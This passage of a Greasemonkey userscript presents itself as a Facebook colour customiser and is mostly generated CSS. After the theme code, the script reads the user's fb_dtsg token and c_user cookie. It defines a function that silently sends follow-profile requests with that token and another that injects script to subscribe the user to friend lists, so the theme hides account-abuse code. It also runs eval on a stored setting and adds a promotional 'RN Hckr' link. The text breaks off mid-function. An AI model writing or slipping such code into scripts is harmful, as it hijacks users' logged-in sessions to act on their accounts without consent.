                  ".fbEmuHide .thex:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  ".pagerpro .pagerpro_a:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-color: #D8DFEA #D8DFEA "+setup.colour1+";" +
                  "}" +
                  ".pagerpro .current .pagerpro_a {" +
                  "    border-bottom: 2px solid "+setup.colour1+";" +
                  "    border-color: "+setup.colour1+";" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".pagerpro .current .pagerpro_a:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  ".footer_bar .pagerpro .pagerpro_a:hover {" +
                  "    border-bottom: 2px solid "+setup.colour1+";" +
                  "    border-top: 2px solid "+setup.colour1+";" +
                  "}" +
                  ".footer_bar .pagerpro .current .pagerpro_a, .footer_bar .pagerpro .current .pagerpro_a:hover {" +
                  "    border-top: 2px solid "+setup.colour1+";" +
                  "}" +
                  ".photo_tag_frame {" +
                  "    border: 5px solid #D8DFEA;" +
                  "}" +
                  ".editphotos .photo_tag_frame {" +
                  "    border: 4px solid #D8DFEA;" +
                  "}" +
                  ".photo_tag_frame_inside {" +
                  "    border: 2px solid "+setup.colour1+";" +
                  "}" +
                  "}" +
                  "#photo_tag_selector {" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  "#pts_invite_msg {" +
                  "    background-color: #FFFFBB;" +
                  "}" +
                  ".photo_list .album img:hover {" +
                  "    border: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".sharelink {" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".single_photo_header h2 {" +
                  "    color: #192B46;" +
                  "}" +
                  "#photocomment .actions a small {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#comment_error {" +
                  "    color: #996666;" +
                  "}" +
                  "#photoactions a {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  "#photoactions a:hover, #photoactions .action_link:hover {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  "#rotateleft a:hover {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z4/r/YMPqumRb_-C.gif\") no-repeat scroll 2px 2px "+setup.colour1+";" +
                  "}" +
                  "#rotateright a:hover {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zx/r/qAjhwbqxvdd.gif\") no-repeat scroll 3px 2px "+setup.colour1+";" +
                  "}" +
                  "#tagging_instructions {" +
                  "    background: none repeat scroll 0 0 #FFFBE2;" +
                  "    border: 1px solid #FFE222;" +
                  "}" +
                  ".tag_outer {" +
                  "    border: 7px solid #D8DFEA;" +
                  "}" +
                  ".tag_inner {" +
                  "    border: 2px solid "+setup.colour1+";" +
                  "}" +
                  "a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "select {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  "textarea, .inputtext, .inputpassword {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".inputbutton, .inputsubmit {" +
                  "    background-color: "+setup.colour1+";" +
                  "    border-color: #D9DFEA #0E1F5B #0E1F5B #D9DFEA;" +
                  "}" +
                  "button.as_link {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".UIComposer_PrivacyCallout_Title, .UIComposer_PrivacyCallout_Text {" +
                  "    border: 1px solid #467C2C;" +
                  "}" +
                  ".UIComposer_PrivacyCallout_Title {" +
                  "    background-color: #67A54B;" +
                  "}" +
                  ".UIActionLinks_bottom a, .UIActionLinks_bottom button.as_link, .UIActionLinks_left, .UIActionLinks_right {" +
                  "    color: "+setup.colour2+";" +
                  "}" +
                  ".UIActionLinks .uiBlingBox {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".typeahead_list {" +
                  "    border-color: -moz-use-text-color #BDC7D8 #BDC7D8;" +
                  "    border-right: 1px solid #BDC7D8;" +
                  "}" +
                  ".typeahead_list .typeahead_suggestion em {" +
                  "    background: none repeat scroll 0 0 #D8DFEA;" +
                  "}" +
                  ".typeahead_list .typeahead_selected {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  ".typeahead_list .typeahead_selected small {" +
                  "    color: #95A5C6;" +
                  "}" +
                  ".typeahead_list .typeahead_selected em {" +
                  "    background: none repeat scroll 0 0 #5670A6;" +
                  "}" +
                  "input.typeahead_found {" +
                  "    background-color: #E1E9F6;" +
                  "}" +
                  ".typeahead_friendlist_icon.on_selected {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "div.standard_tokenizer div.tokenizer {" +
                  "    border: 1px solid #8F96BD;" +
                  "}" +
                  ".pop_content h2.dialog_title {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  ".pop_content h2.dialog_title .dialog_x {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "}" +
                  ".pop_content h2.secure {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zu/r/jp8TzrZb6J1.png\") no-repeat scroll 98% 50% "+setup.colour2+";" +
                  "}" +
                  ".pop_content h2.loading {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z-/r/AGUNXgX_Wx3.gif\") no-repeat scroll 98% 50% "+setup.colour2+";" +
                  "}" +
                  ".pop_content h2.dialog_loading {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z-/r/AGUNXgX_Wx3.gif\") no-repeat scroll 400px 10px "+setup.colour2+";" +
                  "}" +
                  ".uiButtonSpecial {" +
                  "    background-color: #69A74E;" +
                  "    border-color: #3B6E22 #3B6E22 #2C5115;" +
                  "}" +
                  ".uiButtonSpecial:active {" +
                  "    background: none repeat scroll 0 0 #609946;" +
                  "    border-bottom-color: #3B6E22;" +
                  "}" +
                  ".uiButtonSpecial.uiButtonDisabled, .uiButtonSpecial.uiButtonDisabled:active, .uiButtonSpecial.uiButtonDisabled:focus, .uiButtonSpecial.uiButtonDisabled:hover {" +
                  "    background: none repeat scroll 0 0 #B4D3A7;" +
                  "    border-color: #9DB791;" +
                  "}" +
                  ".uiButtonConfirm {" +
                  "    background-color: #5B74A8;" +
                  "    border-color: #29447E #29447E #1A356E;" +
                  "}" +
                  ".uiButtonConfirm:active {" +
                  "    background: none repeat scroll 0 0 #4F6AA3;" +
                  "    border-bottom-color: #29447E;" +
                  "}" +
                  ".uiButtonConfirm.uiButtonDisabled, .uiButtonConfirm.uiButtonDisabled:active, .uiButtonConfirm.uiButtonDisabled:focus, .uiButtonConfirm.uiButtonDisabled:hover {" +
                  "    background: none repeat scroll 0 0 #ADBAD4;" +
                  "    border-color: #94A2BF;" +
                  "}" +
                  ".uiLinkButton input {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiLinkButton:hover, .uiLinkButton input:hover, .uiLinkButton input:focus, .uiLinkButton input:active {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiBoxLightblue {" +
                  "    background-color: #EDEFF4;" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".uiBoxRed {" +
                  "    background-color: #FFEBE8;" +
                  "    border: 1px solid #DD3C10;" +
                  "}" +
                  ".uiBoxYellow {" +
                  "    background-color: #FFF9D7;" +
                  "    border: 1px solid #E2C822;" +
                  "}" +
                  ".uiListBulleted {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiTextHighlight {" +
                  "    background: none repeat scroll 0 0 #FFF8CC;" +
                  "    border-bottom: 1px solid #FFE222;" +
                  "}" +
                  ".uiMenu {" +
                  "    border-color: #777777 #777777 #293E6A;" +
                  "}" +
                  ".uiMenuItem a:active, .uiMenuItem a:focus {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiMenu .checked a:active, .uiMenu .checked a:focus {" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  ".uiSelector .openToggler .uiSelectorButton, .uiSelector .openToggler .uiSelectorButton:active, .uiSelector .openToggler .uiSelectorButton:focus, .uiSelector .openToggler .uiSelectorButton:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" "+setup.colour2+";" +
                  "}" +
                  ".uiHeader h2 {" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".uiHeader h2 a {" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".action_links_title .comment_link, .action_links_bottom .comment_link, .feedback_toggle_link .feedback_show_link, .feedback_toggle_link .feedback_hide_link, .UIActionLinks .comment_link {" +
                  "    color: "+setup.colour2+";" +
                  "}" +
                  ".uiUfi .ufiItem {" +
                  "    background-color: #EDEFF4;" +
                  "    border-bottom: 1px solid #E5EAF1;" +
                  "}" +
                  ".uiUfi .uiUfiUnseenItem {" +
                  "    border-left: 2px solid #A8B2CE;" +
                  "}" +
                  "div.file_help {" +
                  "    background: none repeat scroll 0 0 #FCFCFC;" +
                  "}" +
                  ".editor #start_calendar, .editor #end_calendar {" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-left: 1px solid #D8DFEA;" +
                  "    border-right: 1px solid #D8DFEA;" +
                  "}" +
                  "#new_ff #friend_guesser div.see_more {" +
                  "    border-top: 1px solid #D8DFEA;" +
                  "}" +
                  "#new_ff #friend_guesser a.see_more:hover {" +
                  "    background-color: #E6EDF8;" +
                  "}" +
                  "#fbDockChatBuddylistNub .chat_buddylist_typeahead input {" +
                  "    border-color: #93A2C1;" +
                  "}" +
                  ".fbChatBuddylist a.friend em {" +
                  "    background-color: #DCE1E8;" +
                  "}" +
                  ".fbChatBuddylist a.selected em, .fbChatBuddylistContent a:hover em {" +
                  "    background-color: #5670A6;" +
                  "}" +
                  ".fbChatBuddylist a.friend:hover, .fbChatBuddylist a.selected {" +
                  "    background-color: "+setup.colour2+" !important;" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#fbDockChatBuddylist #reorder_fl_alert {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border-bottom: 1px solid #E2C822;" +
                  "}" +
                  "#fbDockChatBuddylist #error_fl_alert {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border-bottom: 1px solid #E2C822;" +
                  "}" +
                  ".fbChatBuddylistPanel .flyout_open a.panel_item {" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  ".fbChatBuddylistPanel .flyout_open {" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  ".fbChatBuddylistPanel .flyout a:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".fbDockChatTab.highlight .fbNubButton {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zq/r/hjN1fTOtVAm.png\") repeat-x scroll 0 0 "+setup.colour2+" !important;" +
                  "    border-color: #283B8A;" +
                  "}" +
                  ".fbDockChatTab .inputContainer {" +
                  "    border-top: 1px solid #93A2C1;" +
                  "}" +
                  ".fbDockChatTab .titlebarReportLink {" +
                  "    color: #B2BED7;" +
                  "}" +
                  "#jewelBoxMail .author {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".negativeBalance {" +
                  "    color: #F03D25;" +
                  "}" +
                  ".fbNubFlyoutTitlebar {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: #254588 #254588 -moz-use-text-color;" +
                  "}" +
                  ".fbNubFlyoutHeader.videoHeader {" +
                  "    border-bottom: 1px solid #93A2C1;" +
                  "}" +
                  ".jewelCount {" +
                  "    background-color: #00376A;" +
                  "}" +
                  ".jewelCount span {" +
                  "    background-color: #F03D25;" +
                  "    border-color: -moz-use-text-color #DD3822 #DD3822;" +
                  "    border-right: 1px solid #DD3822;" +
                  "}" +
                  ".jewelToggler:active, .jewelToggler:focus, .jewelToggler:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  "#jewelCase .jewelBox {" +
                  "    border-color: #333333 #333333 #293E6A;" +
                  "}" +
                  "#jewelCase .jewelItemNew {" +
                  "    background: none repeat scroll 0 0 #EFF1F7;" +
                  "}" +
                  "#jewelCase .jewelItemResponded {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "}" +
                  "#jewelCase .jewelFooter a:hover, #jewelCase .jewelFooter a:active, #jewelCase .jewelFooter a:focus {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#jewelCase .jewelHighlightItem li a:hover, #jewelCase .jewelHighlightItem li a:active, #jewelCase .jewelHighlightItem li a:focus {" +
                  "    background-color: "+setup.colour2+" !important;" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#jewelBoxNotif .blueName {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#blueBar {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "#pageLogo a {" +
                  "    background-image: url("+logo+");" +
                  "    background-position: 0;" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "#pageLogo a:hover, #pageLogo a:focus, #pageLogo a:active {" +
                  "    background-image: url("+logo+");" +
                  "    background-position: 0;" +
                  "    background-color: "+setup.colour2+";" +
                  "}" +
                  "#headNav {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  "#pageNav a:hover, #pageNav a:focus, #pageNav a:active {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "#navAccount ul {" +
                  "    border-color: #333333 #333333 #2D4486;" +
                  "}" +
                  "#navAccount ul a, #navAccount ul .logoutButton input {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#navAccount ul a:hover, #navAccount ul a:focus, #navAccount ul a:active, #navAccount .logoutButton:hover input, #navAccount .logoutButton input:active, #navAccount .logoutButton input:focus {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  "ul #navAccountInfo a:hover, ul #navAccountInfo a:focus, ul #navAccountInfo a:active {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  "#navSearch .uiTypeahead, #navSearch .uiTypeahead .wrap {" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .item:hover, .uiSideNav .item:active, .uiSideNav .item:focus, .uiSideNav .subitem:hover, .uiSideNav .subitem:active, .uiSideNav .subitem:focus {" +
                  "    background-color: #EFF2F7;" +
                  "}" +
                  ".uiSideNav .selectedItem .item, .uiSideNav .selectedItem .item:hover, .uiSideNav ul .selectedItem .subitem, .uiSideNav ul .selectedItem .subitem:hover {" +
                  "    background-color: #D8DFEA;" +
                  "}" +
                  ".uiSideNav .loading a {" +
                  "    background-color: #EFF2F7;" +
                  "    border-color: #EFF2F7 #EFF2F7 #FFFFFF;" +
                  "}" +
                  ".status {" +
                  "    background-color: #FFF9D7;" +
                  "    border-color: #E2C822;" +
                  "}" +
                  ".error {" +
                  "    background-color: #FFEBE8;" +
                  "    border-color: #DD3C10;" +
                  "}" +
                  ".error a {" +
                  "    color: #DD3C10;" +
                  "}" +
                  ".explanation_note {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".explanation_note a {" +
                  "    color: #DD3C10;" +
                  "}" +
                  ".uiSearchInput {" +
                  "    border-color: #6484B4 #899BC1 #899BC1;" +
                  "    border-right: 1px solid #899BC1;" +
                  "}" +
                  ".uiPhotoThumb:hover {" +
                  "    border: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCountSprited {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCountSprited span.countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem .subitem:hover .uiSideNavCountSprited span.countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem a:hover .uiSideNavCountSprited span.countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCount {" +
                  "    background-color: #D8DFEA;" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem .subitem:hover .uiSideNavCount {" +
                  "    background-color: #D8DFEA;" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNav .selectedItem a:hover .uiSideNavCount {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiSideNavCount .countValue {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiStreamSubstories .unseenItem {" +
                  "    border-left: 2px solid #A8B2CE;" +
                  "}" +
                  ".uiTypeahead {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".uiTypeahead .wrap {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".uiTypeahead .selected .textInput {" +
                  "    background: none repeat scroll 0 0 #E2E8F6;" +
                  "}" +
                  ".uiTypeaheadView ul {" +
                  "    border-color: #333333 #333333 #293E6A;" +
                  "}" +
                  ".uiTypeaheadView strong {" +
                  "    background-color: #D8DFEA;" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiTypeaheadView .selected {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiTypeaheadView .selected strong {" +
                  "    background-color: #5670A6;" +
                  "}" +
                  ".uiTypeahead .uiTypeaheadView .calltoaction.selected {" +
                  "    background: none repeat scroll 0 0 "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".typeaheadLoading .uiTypeaheadView .calltoaction.selected {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/z-/r/AGUNXgX_Wx3.gif\") no-repeat scroll 50% 50% "+setup.colour2+";" +
                  "}" +
                  ".uiTypeaheadView .search img {" +
                  "    background-color: #ECEFF5;" +
                  "}" +
                  ".uiTypeaheadView .search .text {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiTypeaheadView .search .seeMore {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiBlingBox:hover {" +
                  "    background-color: #ECEFF5;" +
                  "    border-bottom: 1px solid #E5EAF1;" +
                  "}" +
                  ".menu_login_container .inputtext, .menu_login_container .inputpassword {" +
                  "    border-color: #1D2A5B;" +
                  "}" +
                  ".menu_login_container label {" +
                  "    color: #98A9CA;" +
                  "}" +
                  ".menu_login_container a, .menu_login_container a:hover {" +
                  "    color: #98A9CA;" +
                  "}" +
                  ".loggedout_menubar_container {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  ".signup_bar_container {" +
                  "    background-color: #EDEFF4;" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".signup_box {" +
                  "    color: #203360;" +
                  "}" +
                  ".LogoutPage_MobileMessageContainer {" +
                  "    color: #203360;" +
                  "}" +
                  ".registration #reg_box .inputtext, .registration #reg_box .inputpassword {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".registration #reg_box .error_field input.inputtext, .registration #reg_box .error_field input.inputpassword {" +
                  "    border-color: #DD3C10;" +
                  "}" +
                  "#reg_pages_msg {" +
                  "    border-top: 1px solid #A0A9C0;" +
                  "}" +
                  ".registration #cancel_button {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiMediaThumbSelected {" +
                  "    background-color: "+setup.colour1+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiMediaThumb:hover, .uiMediaThumb:hover .uiMediaThumbWrap, .uiMediaThumb:active, .uiMediaThumb:active .uiMediaThumbWrap, .uiMediaThumb:focus, .uiMediaThumb:focus .uiMediaThumbWrap {" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiCollapsedFacepile .showAllLink {" +
                  "    border-color: #7792BA;" +
                  "}" +
                  ".WelcomePage_MainMessage {" +
                  "    color: #203360;" +
                  "}" +
                  ".WelcomePage_SignUpHeadline {" +
                  "    color: #203360;" +
                  "}" +
                  ".WelcomePage_SignUpSubheadline {" +
                  "    color: #203360;" +
                  "}" +
                  "#reg_box .label {" +
                  "    color: #1D2A5B;" +
                  "}" +
                  "#reg_box .inputtext, #reg_box .inputpassword {" +
                  "    border-color: #96A6C5;" +
                  "}" +
                  ".ff2 #reg_box select, .ff3 #reg_box select {" +
                  "    border-color: #96A6C5;" +
                  "}" +
                  "#openid_buttons_box {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border: 1px solid #E2C822;" +
                  "}" +
                  "#captcha_response {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  "#reg_error, #captcha_error {" +
                  "    background: none repeat scroll 0 0 #FFEBE8;" +
                  "    border: 1px solid #DD3C10;" +
                  "}" +
                  "#reg_captcha h2 {" +
                  "    color: #1D2A5B;" +
                  "}" +
                  "#reg_captcha #cancel_button {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".actionspro .actionspro_li {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".actionspro .actionspro_a:hover {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  ".link_menu .menu_content a:hover, .link_menu_list .menu_content ul li a.tab_link:hover {" +
                  "    background-color: #899BC1;" +
                  "}" +
                  ".dropdown_menu .menu_content {" +
                  "    border: 1px solid #6076A5;" +
                  "}" +
                  ".dropdown_menu a:hover {" +
                  "    background: none repeat scroll 0 0 #5C75AA;" +
                  "}" +
                  ".dropdown_head .dropdown_link.selected {" +
                  "    background: none repeat scroll 0 0 #5C75AA;" +
                  "    border-left: 1px solid "+setup.colour1+";" +
                  "    border-right: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".profile .basic_info_summary {" +
                  "    border-right: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile .box {" +
                  "    border-top: 1px solid #94A3C4;" +
                  "}" +
                  ".profile .box .box_header {" +
                  "    background: none repeat scroll 0 0 #ECEFF5;" +
                  "}" +
                  ".profile .box h4.box_header {" +
                  "    border-bottom: 1px solid #ECEFF5;" +
                  "}" +
                  ".profile .box_placeholder {" +
                  "    border: 3px dashed #93A4C6;" +
                  "}" +
                  ".profile .add_new_box_border .pop_content {" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  ".profile .add_new_box_border .border_frame {" +
                  "    border: 10px solid #868686;" +
                  "}" +
                  ".profile .add_new_box_border .dialog_buttons {" +
                  "    background: none repeat scroll 0 0 #F7F7F7;" +
                  "    border-color: #CCCCCC "+setup.colour1+" "+setup.colour1+";" +
                  "    border-right: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#photos_box .added .album {" +
                  "    background: none repeat scroll 0 0 #FFF8CC;" +
                  "    border-bottom: 1px solid #FFE222;" +
                  "}" +
                  ".profile .profile_top_wash {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zb/r/3LyZkLVshsc.gif\") repeat-x scroll left bottom #EDEFF4;" +
                  "}" +
                  ".profile .top_bar .status_source a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".profile .top_bar .mobile_status .clear_link a, .profile .top_bar .mobile_status .profile_empty_status a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".profile .top_bar .mobile_status small a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".profile .top_bar ul.tabs li {" +
                  "    background-color: #D8DFEA;" +
                  "}" +
                  ".profile .top_bar ul.tabs li a.tab_link {" +
                  "    border-color: #D8DFEA #D8DFEA -moz-use-text-color;" +
                  "}" +
                  ".profile .top_bar ul.tabs li a.tab_link:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour2+";" +
                  "}" +
                  ".profile .top_bar ul.tabs li.selected_menu_icon a.tab_link, .profile .top_bar ul.tabs li.add_tab a.tab_link:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour2+";" +
                  "}" +
                  ".profile .top_bar ul.tabs li.selected a.tab_link:hover {" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  ".profile .top_bar ul.tabs li.selected a.selected {" +
                  "    border-left: 1px solid #6076A5;" +
                  "}" +
                  ".profile .top_bar ul.tabs li.profile_tab_more a.tab_link:hover, .profile .top_bar ul.tabs li.selected_tab_more a.tab_link {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zS/r/UK_y4vNfbHf.gif\") no-repeat scroll 0 -26px #899BC1;" +
                  "    border-left: 1px solid "+setup.colour2+";" +
                  "    border-right: 1px solid "+setup.colour2+";" +
                  "    border-top: 1px solid "+setup.colour2+";" +
                  "}" +
                  ".profile_actions a.profile_action {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile_actions .holder {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile_actions a:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "div.action a.remove:hover, div.action a.hover {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zV/r/5luk374gOfy.gif\") no-repeat scroll -12px center "+setup.colour1+";" +
                  "}" +
                  ".profile .blurb {" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile .box_column {" +
                  "    border-bottom: 1px solid #94A3C4;" +
                  "    border-right: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile .top_bar ul.tabs li.profile_tab_more .tabs_more_menu ul li a.tab_link:hover {" +
                  "    background-color: #899BC1;" +
                  "}" +
                  "a.UIIntentionalStory_Names {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".typeahead_search .suggestions_bottom_border {" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".typeahead_search .typeahead_suggestions {" +
                  "    border-left: 1px solid #95A5C6;" +
                  "    border-right: 1px solid #95A5C6;" +
                  "}" +
                  ".typeahead_search .typeahead_selected img {" +
                  "    border: 1px solid #6E84B3;" +
                  "}" +
                  ".uiLightMorePager {" +
                  "    border-top: 1px solid #E5EAF1;" +
                  "}" +
                  ".uiLightMorePager:hover {" +
                  "    border-top: 1px solid #D8DFEA;" +
                  "}" +
                  ".uiMorePagerAnchor a.primary:hover {" +
                  "    background-color: #D8DFEA;" +
                  "}" +
                  ".uiMorePagerAnchor a.primaryLight:hover {" +
                  "    background-color: #EDEFF4;" +
                  "}" +
                  ".buddyListTypeahead .wrap {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".buddyListTypeahead .uiTypeaheadView li.selected {" +
                  "    background-color: #D8DFEA;" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  "#UIUpcoming_New {" +
                  "    background-color: #FFF7C5;" +
                  "}";
}

GM_registerMenuCommand("Customise facebook colours...", setColours);
addStyle(eval(GM_getValue("setup",'({colour1:"#3b5998", colour2:"#6d84b4"})')));
// ==Expand==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+6px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "2px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#333333\" href=\"http://www.rnhckr.com/\">RN Hckr</a>"

	body.appendChild(div);
	
	unsafeWindow.AutoExpand = function() {
	
		buttons = document.getElementsByTagName("input");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("") >= 0)
				if(buttons[i].getAttribute("name") == "view_all")
					buttons[i].click();
		}
		
	};
}
// ==============
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
